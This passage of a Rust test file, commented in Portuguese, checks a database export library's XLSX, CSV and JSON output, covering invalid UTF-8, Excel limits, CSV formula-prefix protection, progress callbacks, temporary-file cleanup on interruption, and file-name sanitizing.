    assert!(erro.mensagem.contains("relatorio.zip"), "{erro}");
    assert!(erro.tem_codigo(Codigo::DestinoExiste));
    assert_eq!(
        erro.mensagem,
        "O banco inteiro em CSV é gravado num .zip, e já existe relatorio.zip nesta pasta; escolha outro nome."
    );
    assert_eq!(nomes_no_zip(&existente), ["importante.txt"]);
    // escolhido o próprio .zip (o diálogo pergunta se substitui), grava
    assert_eq!(varias(boa(), Formato::Csv, &existente).unwrap().caminho, existente);
    assert_eq!(destino_final(Formato::Csv, &pasta.join("x.csv"), true).unwrap(), pasta.join("x.zip"));
    assert_eq!(destino_final(Formato::Csv, &pasta.join("x.csv"), false).unwrap(), pasta.join("x.csv"));
    assert_eq!(destino_final(Formato::Csv, &pasta.join("x.CSV"), true).unwrap(), pasta.join("x.zip"));
    assert_eq!(destino_final(Formato::Csv, &pasta.join("x.txt"), true).unwrap(), pasta.join("x.txt"));
    assert_eq!(destino_final(Formato::Json, &pasta.join("x.csv"), true).unwrap(), pasta.join("x.csv"));
}

#[test]
fn texto_com_utf8_invalido_nos_tres_formatos() {
    // O texto inválido chega decodificado com substituição: cada trecho ruim vira U+FFFD, e daí em diante é um texto como outro qualquer (proteção de fórmula, corte do Excel, escape do JSON).
    let bruto = |b: &[u8]| Valor::TextoBruto(b.to_vec());
    let longo: Vec<u8> = [b"\xff".as_slice(), "z".repeat(40_000).as_bytes()].concat();
    let linhas = || vec![vec![bruto(b"S\xe3o"), bruto(b"=\xff")], vec![bruto(&longo), bruto(b"a\x01b\xfe")]];
    let colunas = ["nome", "formula"];
    let pasta = Pasta::nova("texto_bruto");

    let xlsx = pasta.join("bruto.xlsx");
    let resumo = exportar(&colunas, linhas(), Formato::Xlsx, &xlsx);
    let m = mapa(&xml_da_planilha(&xlsx, 1));
    assert_eq!(texto_de(&m, "A2"), "S\u{fffd}o");
    assert_eq!(texto_de(&m, "B2"), "=\u{fffd}"); // texto, nunca fórmula
    assert_eq!(texto_de(&m, "A3"), format!("\u{fffd}{}", "z".repeat(LIMITE_TEXTO_EXCEL - 1)));
    assert_eq!(texto_de(&m, "B3"), "ab\u{fffd}"); // sem o caractere de controle
    assert_eq!(resumo.avisos, ["1 célula de texto passou de 32.767 caracteres, o máximo do Excel, e foi cortada."]);

    let csv = pasta.join("bruto.csv");
    exportar(&colunas, linhas(), Formato::Csv, &csv);
    let lidas = ler_csv(&csv, ';');
    assert_eq!(lidas[1], ["S\u{fffd}o", "'=\u{fffd}"]);
    assert_eq!(lidas[2], [format!("\u{fffd}{}", "z".repeat(40_000)), "a\u{1}b\u{fffd}".to_string()]);
    let sem = pasta.join("sem_protecao.csv");
    let opcoes = Opcoes { csv_proteger_formulas: false, ..Opcoes::default() };
    exportar_com(&colunas, linhas(), Formato::Csv, &sem, &opcoes).unwrap();
    assert_eq!(ler_csv(&sem, ';')[1], ["S\u{fffd}o", "=\u{fffd}"]);

    let json = pasta.join("bruto.json");
    exportar(&colunas, linhas(), Formato::Json, &json);
    assert_eq!(
        ler_json(&json),
        json!([
            {"nome": "S\u{fffd}o", "formula": "=\u{fffd}"},
            {"nome": format!("\u{fffd}{}", "z".repeat(40_000)), "formula": "a\u{1}b\u{fffd}"},
        ])
    );
    assert!(fs::read_to_string(&json).unwrap().contains("\"a\\u0001b\u{fffd}\""));

    // no banco inteiro em CSV (o .zip) também
    let zip = pasta.join("banco.zip");
    let lista: Vec<FonteTeste<'_>> = vec![("t", &colunas, linhas())];
    varias(lista, Formato::Csv, &zip).unwrap();
    assert!(sem_bom(&parte_bytes(&zip, "t.csv")).starts_with("nome;formula\r\nS\u{fffd}o;'=\u{fffd}\r\n"));
}

/// Linhas com tudo o que o Excel não comporta como está: BLOB grande, texto longo (também com caracteres de
/// vários bytes), real fora da faixa, texto com UTF-8 inválido.
fn linhas_que_o_excel_adapta() -> Vec<Vec<Valor>> {
    let grande = vec![7u8; 60_000];
    vec![
        vec![
            int(1),
            blob(&grande),
            txt(&"x".repeat(40_000)),
            real(1.797_693_134_862_315_7e308),
            Valor::TextoBruto(b"S\xe3o".to_vec()),
        ],
        vec![int(GRANDE), blob(b"\x01\x02"), txt("a\x01b"), real(0.5), NULO],
        vec![int(3), blob(&grande), txt(&"ç".repeat(LIMITE_TEXTO_EXCEL + 1)), real(-1e308), txt("")],
    ]
}

#[test]
fn excel_amostra_guarda_so_a_celula_e_grava_o_mesmo() {
    // A amostra das larguras guarda as linhas já como células (BLOB grande como o marcador, texto cortado), e
    // não os valores inteiros. Com a amostra inteira (as três linhas guardadas) ou de uma linha só (as outras
    // gravadas direto), as células e os avisos são os mesmos.
    let pasta = Pasta::nova("amostra_celulas");
    let colunas = ["id", "anexo", "texto", "real", "bruto"];
    let guardadas = pasta.join("guardadas.xlsx");
    let resumo_guardadas = exportar_limitado(
        &colunas,
        linhas_que_o_excel_adapta(),
        &guardadas,
        "dados",
        limites(AMOSTRA_LARGURA, LIMITE_LINHAS_EXCEL),
    );
    let diretas = pasta.join("diretas.xlsx");
    let resumo_diretas =
        exportar_limitado(&colunas, linhas_que_o_excel_adapta(), &diretas, "dados", limites(1, LIMITE_LINHAS_EXCEL));
    let celulas_guardadas = celulas(&xml_da_planilha(&guardadas, 1));
    assert_eq!(celulas_guardadas, celulas(&xml_da_planilha(&diretas, 1)));
    assert_eq!(resumo_guardadas.avisos, resumo_diretas.avisos);
    assert_eq!(
        resumo_guardadas.avisos,
        [
            "2 células de texto passaram de 32.767 caracteres, o máximo do Excel, e foram cortadas.",
            "2 conteúdos binários (BLOB) não couberam numa célula do Excel; ficaram só a indicação do tamanho. \
             Para ter o conteúdo, exporte em CSV ou JSON ou use “Salvar em arquivo”.",
            "2 números reais ficaram fora da faixa do Excel e foram gravados como texto.",
        ]
    );
    let m: HashMap<String, Cel> = celulas_guardadas.into_iter().collect();
    assert!(texto_de(&m, "B2").starts_with("[BLOB de 60.000 bytes"));
    assert_eq!(STANDARD.decode(texto_de(&m, "B3")).unwrap(), b"\x01\x02");
    assert_eq!(texto_de(&m, "C2"), "x".repeat(LIMITE_TEXTO_EXCEL));
    assert_eq!(texto_de(&m, "C3"), "ab");
    assert_eq!(texto_de(&m, "C4"), "ç".repeat(LIMITE_TEXTO_EXCEL));
    assert_eq!(texto_de(&m, "D2"), "1.7976931348623157e+308");
    assert_eq!(numero_de(&m, "D3"), "0.5");
    assert_eq!(texto_de(&m, "E2"), "S\u{fffd}o");
    assert_eq!(texto_de(&m, "A3"), "9007199254740993");
    assert_eq!((valor_de(&m, "E3"), valor_de(&m, "E4")), (None, None));
    // as larguras saem da amostra reduzida: o texto cortado e o marcador passam do máximo; o real fora da
    // faixa conta como o texto que foi para a célula
    let xml = xml_da_planilha(&guardadas, 1);
    for (coluna, largura) in [(2, 60), (3, 60), (4, 25), (5, 8)] {
        assert!(xml.contains(&format!("<col min=\"{coluna}\" max=\"{coluna}\" width=\"{largura}\"")), "{coluna}");
    }
}

#[test]
fn linhas_do_escritor_no_excel_so_contam_a_amostra_quando_gravada() {
    // o número de Escritor::linhas() é o do ao_progresso: no Excel, a amostra das larguras só conta quando vai
    // para a planilha
    let pasta = Pasta::nova("linhas_amostra");
    let mut escritor =
        Escritor::novo(Formato::Xlsx, &pasta.join("a.xlsx"), &Opcoes::default(), true, None, Acompanhamento::default())
            .unwrap();
    escritor.comecar_tabela("t", &cols(&["n", "texto"])).unwrap();
    for linha in linhas_numeradas(150) {
        escritor.linha(&linha).unwrap();
    }
    assert_eq!(escritor.linhas(), 0);
    escritor.terminar_tabela().unwrap();
    assert_eq!(escritor.linhas(), 150);
    escritor.comecar_tabela("u", &cols(&["n", "texto"])).unwrap();
    let mut linhas = linhas_numeradas(AMOSTRA_LARGURA as u64 + 1).into_iter();
    for linha in linhas.by_ref().take(AMOSTRA_LARGURA) {
        escritor.linha(&linha).unwrap();
    }
    assert_eq!(escritor.linhas(), 150);
    escritor.linha(&linhas.next().unwrap()).unwrap(); // a linha seguinte à amostra leva as guardadas junto
    assert_eq!(escritor.linhas(), 150 + AMOSTRA_LARGURA as u64 + 1);
    assert_eq!(escritor.concluir().unwrap().linhas, 351);

    for formato in [Formato::Csv, Formato::Json] {
        let mut escritor = Escritor::novo(
            formato,
            &pasta.join(&format!("a.{formato}")),
            &Opcoes::default(),
            false,
            None,
            Acompanhamento::default(),
        )
        .unwrap();
        escritor.comecar_tabela("t", &cols(&["n", "texto"])).unwrap();
        for linha in linhas_numeradas(150) {
            escritor.linha(&linha).unwrap();
        }
        assert_eq!(escritor.linhas(), 150, "{formato}");
    }
}

// ---------------------------------------------------------------------------------------------------
// E) callbacks
// ---------------------------------------------------------------------------------------------------

fn linhas_volume(n: u64) -> impl Iterator<Item = Resultado<Vec<Valor>>> {
    (0..n).map(|i| Ok(vec![int(i as i64), txt(&format!("texto {i}")), real(i as f64 / 3.0)]))
}

fn colunas_volume() -> Vec<String> {
    cols(&["id", "t", "r"])
}

type Lista<T> = Arc<Mutex<Vec<T>>>;

fn lista<T>() -> Lista<T> {
    Arc::new(Mutex::new(Vec::new()))
}

fn copia<T: Clone>(l: &Lista<T>) -> Vec<T> {
    l.lock().unwrap().clone()
}

#[test]
fn ao_progresso_a_cada_mil_linhas() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("progresso");
        let chamadas: Lista<u64> = lista();
        let eventos: Lista<usize> = lista();
        let (c1, c2, e) = (Arc::clone(&chamadas), Arc::clone(&chamadas), Arc::clone(&eventos));
        let acomp = Acompanhamento::default()
            .ao_progresso(move |n| {
                c1.lock().unwrap().push(n);
                Ok(())
            })
            .ao_finalizar(move || {
                let n = c2.lock().unwrap().len();
                e.lock().unwrap().push(n);
                Ok(())
            });
        let resumo = exportar_linhas(
            &colunas_volume(),
            linhas_volume(3_500),
            formato,
            &pasta.join(&format!("a.{formato}")),
            &Opcoes::default(),
            "dados",
            acomp,
        )
        .unwrap();
        assert_eq!(resumo.linhas, 3_500);
        let chamadas = copia(&chamadas);
        assert_eq!(chamadas[..3], [1000, 2000, 3000], "{formato}");
        assert_eq!(*chamadas.last().unwrap(), 3_500);
        assert!(chamadas[3..].iter().all(|n| *n == 3_500)); // na finalização e antes da troca, com o total final
        assert_eq!(copia(&eventos), [3]); // ao_finalizar uma vez, depois das linhas
    }
}

#[test]
fn exportar_varias_soma_e_informa_a_tabela() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("varias_progresso");
        let chamadas: Lista<u64> = lista();
        let tabelas: Lista<(String, usize, Vec<u64>)> = lista();
        let finais: Lista<Vec<u64>> = lista();
        let (c1, c2, c3) = (Arc::clone(&chamadas), Arc::clone(&chamadas), Arc::clone(&chamadas));
        let (t, f) = (Arc::clone(&tabelas), Arc::clone(&finais));
        let acomp = Acompanhamento::default()
            .ao_progresso(move |n| {
                c1.lock().unwrap().push(n);
                Ok(())
            })
            .ao_tabela(move |nome, feitas| {
                let vistas = c2.lock().unwrap().clone();
                t.lock().unwrap().push((nome.to_string(), feitas, vistas));
                Ok(())
            })
            .ao_finalizar(move || {
                let vistas = c3.lock().unwrap().clone();
                f.lock().unwrap().push(vistas);
                Ok(())
            });
        let lista_fontes = vec![
            ("um", colunas_volume(), linhas_volume(1_500)),
            ("dois", colunas_volume(), linhas_volume(700)),
            ("três", colunas_volume(), linhas_volume(900)),
        ];
        let resumo = exportar_varias(
            lista_fontes,
            formato,
            &pasta.join(&format!("b.{formato}")),
            &Opcoes::default(),
            None,
            acomp,
        )
        .unwrap();
        assert_eq!((resumo.linhas, resumo.tabelas), (3_100, 3));
        let chamadas = copia(&chamadas);
        // a cada 1.000 linhas somando as fontes; no .zip, também com o total de até ali enquanto comprime cada CSV
        assert_eq!(chamadas.iter().filter(|n| *n % 1000 == 0).copied().collect::<Vec<_>>(), [1000, 2000, 3000]);
        assert!(chamadas.windows(2).all(|w| w[0] <= w[1]) && *chamadas.last().unwrap() == 3_100);
        assert!(chamadas.iter().all(|n| [1000, 1500, 2000, 2200, 3000, 3100].contains(n)), "{formato}: {chamadas:?}");
        let tabelas = copia(&tabelas);
        let nomes: Vec<(&str, usize)> = tabelas.iter().map(|(n, f, _)| (n.as_str(), *f)).collect();
        assert_eq!(nomes, [("um", 0), ("dois", 1), ("três", 2)]);
        let (um, dois, tres) = (&tabelas[0].2, &tabelas[1].2, &tabelas[2].2);
        assert!(um.is_empty());
        assert!(dois.contains(&1000) && dois.iter().max().unwrap() <= &1500);
        assert!(tres.contains(&2000) && tres.iter().max().unwrap() <= &2200);
        let finais = copia(&finais);
        assert!(finais.len() == 1 && finais[0].contains(&3000));
    }
}

#[test]
fn callback_que_levanta_apaga_o_temporario_e_a_excecao_sobe_como_veio() {
    let excecoes = [
        ErroBanco::novo("pare"),
        ErroBanco::novo("Erro ao acessar o arquivo: do callback.").detalhe("do callback"),
        ErroBanco::novo("O SQLite recusou a operação: do callback.").detalhe("do callback"),
        ErroBanco::com_status("cancelado", 409).codigo(Codigo::Cancelado),
    ];
    for formato in Formato::TODOS {
        for excecao in &excecoes {
            let pasta = Pasta::nova("callback");
            let destino = pasta.join(&format!("c.{formato}"));
            fs::write(&destino, b"original").unwrap();
            let levantar = excecao.clone();
            let acomp =
                Acompanhamento::default().ao_progresso(move |n| if n >= 2000 { Err(levantar.clone()) } else { Ok(()) });
            let erro = exportar_linhas(
                &colunas_volume(),
                linhas_volume(5_000),
                formato,
                &destino,
                &Opcoes::default(),
                "dados",
                acomp,
            )
            .unwrap_err();
            assert_eq!(&erro, excecao, "{formato}");
            assert_eq!(fs::read(&destino).unwrap(), b"original");
            pasta.sem_temporarios();
        }
    }
}

#[test]
fn interromper_na_finalizacao_deixa_o_destino_intacto() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("finalizacao");
        let destino = pasta.join(&format!("d.{formato}"));
        fs::write(&destino, b"original").unwrap();
        let finalizando = Arc::new(Mutex::new(false));
        let depois: Lista<u64> = lista();
        let (f1, f2, d) = (Arc::clone(&finalizando), Arc::clone(&finalizando), Arc::clone(&depois));
        let pare = ErroBanco::novo("pare");
        let devolver = pare.clone();
        let acomp = Acompanhamento::default()
            .ao_progresso(move |n| {
                if *f1.lock().unwrap() {
                    d.lock().unwrap().push(n);
                    return Err(devolver.clone());
                }
                Ok(())
            })
            .ao_finalizar(move || {
                *f2.lock().unwrap() = true;
                Ok(())
            });
        let erro = exportar_linhas(
            &colunas_volume(),
            linhas_volume(20_000),
            formato,
            &destino,
            &Opcoes::default(),
            "dados",
            acomp,
        )
        .unwrap_err();
        assert_eq!(erro, pare);
        assert_eq!(copia(&depois), [20_000]);
        assert_eq!(fs::read(&destino).unwrap(), b"original");
        pasta.sem_temporarios();
    }
}

#[test]
fn varias_interrompidas_no_zip_e_ao_trocar_de_tabela() {
    let pasta = Pasta::nova("zip_interrompido");
    let destino = pasta.join("e.zip");
    let pare = ErroBanco::novo("pare");
    let devolver = pare.clone();
    let acomp =
        Acompanhamento::default().ao_tabela(move |nome, _| if nome == "dois" { Err(devolver.clone()) } else { Ok(()) });
    let dez = || (0..10).map(|i| Ok::<_, ErroBanco>(vec![int(i)]));
    let lista_fontes = vec![("um", cols(&["id"]), dez()), ("dois", cols(&["id"]), dez())];
    let trabalho = Pasta::nova("zip_interrompido_trabalho");
    let escritor = Escritor::novo(Formato::Csv, &destino, &Opcoes::default(), true, None, acomp)
        .unwrap()
        .com_limites(trabalho_em(&trabalho));
    let erro = gravar_fontes(escritor, lista_fontes).unwrap_err();
    assert_eq!(erro, pare);
    assert!(!destino.exists());
    pasta.sem_temporarios();
    esperar_vazia(&trabalho.0);

    // interrompido no meio da compressão de um CSV (o aviso de progresso a cada bloco), com ele aberto
    let na_hora: Lista<Vec<String>> = lista();
    let (vistos, pasta_trabalho) = (Arc::clone(&na_hora), trabalho.0.clone());
    let devolver = pare.clone();
    let acomp = Acompanhamento::default().ao_progresso(move |_| {
        vistos.lock().unwrap().push(conteudo_da_pasta(&pasta_trabalho));
        Err(devolver.clone())
    });
    let lista_fontes = vec![("um", cols(&["id"]), dez()), ("dois", cols(&["id"]), dez())];
    let escritor = Escritor::novo(Formato::Csv, &destino, &Opcoes::default(), true, None, acomp)
        .unwrap()
        .com_limites(trabalho_em(&trabalho));
    assert_eq!(gravar_fontes(escritor, lista_fontes).unwrap_err(), pare);
    let na_hora = copia(&na_hora);
    assert_eq!(na_hora.len(), 1);
    assert_eq!(na_hora[0].len(), usize::from(cfg!(windows)), "{na_hora:?}");
    assert!(!destino.exists());
    pasta.sem_temporarios();
    esperar_vazia(&trabalho.0);
}

#[test]
fn erro_do_iteravel_continua_como_era() {
    // O comportamento que os callbacks copiam: temporário apagado; erro de leitura com o contexto de leitura,
    // e o que tem código (cancelado, substituído) como veio.
    let pasta = Pasta::nova("iteravel");
    let quebra = |erro: ErroBanco| vec![Ok(vec![int(1), txt("a"), real(0.5)]), Err(erro)];
    let cancelado =
        ErroBanco::com_status("Exportação interrompida; nenhum arquivo foi gravado.", 409).codigo(Codigo::Cancelado);
    let erro = exportar_linhas(
        &colunas_volume(),
        quebra(cancelado.clone()),
        Formato::Csv,
        &pasta.join("f.csv"),
        &Opcoes::default(),
        "dados",
        Acompanhamento::default(),
    )
    .unwrap_err();
    assert_eq!(erro, cancelado);
    let interrompido = ErroBanco::novo("O SQLite recusou a operação: interrupted.").detalhe("interrupted");
    let erro = exportar_linhas(
        &colunas_volume(),
        quebra(interrompido),
        Formato::Xlsx,
        &pasta.join("f.xlsx"),
        &Opcoes::default(),
        "dados",
        Acompanhamento::default(),
    )
    .unwrap_err();
    assert!(erro.mensagem.contains("Não foi possível ler os dados para exportar"), "{erro}");
    assert_eq!(erro.detalhe.as_deref(), Some("interrupted"));
    pasta.sem_temporarios();
    assert!(pasta.arquivos().is_empty());
}

/// Gera arquivos para conferir fora dos testes (openpyxl, o próprio Excel):
/// `EXPORTAR_AMOSTRAS=<pasta> cargo test -p exportar -- --ignored gerar_amostras`.
#[test]
#[ignore]
fn gerar_amostras_para_conferencia() {
    let Some(pasta) = std::env::var_os("EXPORTAR_AMOSTRAS").map(PathBuf::from) else {
        return;
    };
    fs::create_dir_all(&pasta).unwrap();
    let opcoes = Opcoes::default();
    let nenhum = Acompanhamento::default;
    exportar_linhas(
        &cols(&COLUNAS_VARIADAS),
        ok(linhas_variadas()),
        Formato::Xlsx,
        &pasta.join("variadas.xlsx"),
        &opcoes,
        "clien'tes & cia",
        nenhum(),
    )
    .unwrap();
    exportar_linhas(
        &cols(&["=cabeçalho", " espaço", "a&b<c>"]),
        ok(vec![
            vec![txt(" com espaço "), txt("cr\r\nlf"), txt("_x0041_ e _x00_")],
            vec![txt("<&>\"'"), txt("\ttab"), txt("#REF!")],
            vec![real(1e-7), real(1e16), int(-999_999_999_999_999)],
        ]),
        Formato::Xlsx,
        &pasta.join("escape.xlsx"),
        &opcoes,
        "dados \"x\" & <y>",
        nenhum(),
    )
    .unwrap();
    let escritor = Escritor::novo(Formato::Xlsx, &pasta.join("continua.xlsx"), &opcoes, false, None, nenhum())
        .unwrap()
        .com_limites(limites(3, 5));
    gravar_fonte_unica(escritor, "eventos", &cols(&["n", "texto"]), ok(linhas_numeradas(12))).unwrap();
    let x40 = "x".repeat(40);
    let lista: Vec<FonteTeste<'_>> = vec![
        ("clientes", &["id", "nome"], vec![vec![int(1), txt("Ana")], vec![int(2), NULO]]),
        ("CLIENTES", &["a"], vec![vec![int(2)]]),
        ("a/b:c", &["a"], vec![vec![int(3)]]),
        (x40.as_str(), &["a"], vec![vec![int(4)]]),
        (x40.as_str(), &["a"], vec![vec![int(5)]]),
        ("vazia", &["x", "y"], vec![]),
        ("sem colunas", &[], vec![vec![int(1), txt("a")]]),
        ("só nulos", &["a", "b"], vec![vec![NULO, NULO], vec![int(1), NULO]]),
    ];
    varias(lista, Formato::Xlsx, &pasta.join("banco.xlsx")).unwrap();
    varias(vec![], Formato::Xlsx, &pasta.join("nada.xlsx")).unwrap();
    let reais =
        [1.797_693_134_862_315_7e308, -1e308, 9.99999999999999e307, 5e-324, 0.0, 0.300_000_000_000_000_04, -0.0];
    let mut linhas: Vec<Vec<Valor>> = reais.iter().map(|v| vec![real(*v), NULO]).collect();
    linhas[0][1] = blob(&vec![7u8; 60_000]);
    linhas[1][1] = txt(&"y".repeat(40_000));
    exportar_linhas(
        &cols(&["r", "outro"]),
        ok(linhas),
        Formato::Xlsx,
        &pasta.join("reais.xlsx"),
        &opcoes,
        "reais",
        nenhum(),
    )
    .unwrap();
    let grandes = (0..100_000i64).map(|i| {
        Ok::<_, ErroBanco>(vec![
            int(i),
            txt(&format!("Cliente {i}")),
            real(i as f64 * 1.25),
            if i % 9 == 0 { NULO } else { txt("São Paulo") },
        ])
    });
    exportar_linhas(
        &cols(&["id", "nome", "valor", "cidade"]),
        grandes,
        Formato::Xlsx,
        &pasta.join("grande.xlsx"),
        &opcoes,
        "grande",
        nenhum(),
    )
    .unwrap();
    let lista: Vec<FonteTeste<'_>> = vec![
        ("clientes", &["id", "nome"], vec![vec![int(1), txt("Carla")], vec![int(2), txt("=1+1")]]),
        ("Tabela com espaço", &["número"], vec![vec![int(1)], vec![NULO]]),
    ];
    varias(lista, Formato::Csv, &pasta.join("banco.csv")).unwrap();
    exportar_linhas(
        &cols(&COLUNAS_CSV),
        ok(vec![linha_csv()]),
        Formato::Csv,
        &pasta.join("linha.csv"),
        &opcoes,
        "dados",
        nenhum(),
    )
    .unwrap();
}

// ---------------------------------------------------------------------------------------------------
// Peças
// ---------------------------------------------------------------------------------------------------

#[test]
fn letras_das_colunas() {
    let casos = [(0, "A"), (25, "Z"), (26, "AA"), (51, "AZ"), (52, "BA"), (701, "ZZ"), (702, "AAA"), (16_383, "XFD")];
    for (indice, esperado) in casos {
        assert_eq!(xlsx::letra_coluna(indice), esperado);
    }
}

#[test]
fn valores_pequenos() {
    assert_eq!(valores::numero(0), "0");
    assert_eq!(valores::numero(999), "999");
    assert_eq!(valores::numero(1_000), "1.000");
    assert_eq!(valores::numero(1_234_567), "1.234.567");
    // número guardado como texto não é fórmula; um "\n" no fim também é aceito
    for numero in ["-5", "+1,5", "5", "-0.25", "+3\n"] {
        assert!(!valores::precisa_protecao(numero), "{numero:?}");
    }
    for formula in ["-", "+", "-5,", "-,5", "-5.5.5", "=1", "@a", "\t1", "\r1", "-5\n\n", "-1+1"] {
        assert!(valores::precisa_protecao(formula), "{formula:?}");
    }
    // o corte do texto do Excel respeita os caracteres de vários bytes
    let longo = "ç".repeat(LIMITE_TEXTO_EXCEL + 5);
    let (cortado, foi) = valores::texto_excel(&longo);
    assert!(foi && cortado.chars().count() == LIMITE_TEXTO_EXCEL);
    let no_limite = "ç".repeat(LIMITE_TEXTO_EXCEL);
    let (inteiro, foi) = valores::texto_excel(&no_limite);
    assert!(!foi && inteiro.chars().count() == LIMITE_TEXTO_EXCEL);
    assert_eq!(valores::chaves_unicas(&cols(&["a", "a", "a_2", "a"])), ["a", "a_3", "a_2", "a_4"]);
    assert_eq!(valores::real_texto(f64::NAN, true), "");
    assert_eq!(valores::real_texto(-2.5e-7, true), "-2,5e-07");
    assert!(!valores::blob_grande(24_573) && valores::blob_grande(24_574)); // base64 de 32.764 e de 32.768
    let mut usados = HashSet::new();
    assert_eq!(valores::nome_arquivo("lpt1.dados", &mut usados, ".csv"), "_lpt1.dados.csv");
    assert_eq!(valores::nome_arquivo("COM10", &mut usados, ".csv"), "COM10.csv");
    assert_eq!(valores::nome_arquivo("...", &mut usados, ".csv"), "tabela.csv");
    assert_eq!(valores::nome_arquivo("", &mut usados, ".csv"), "tabela (2).csv");
}
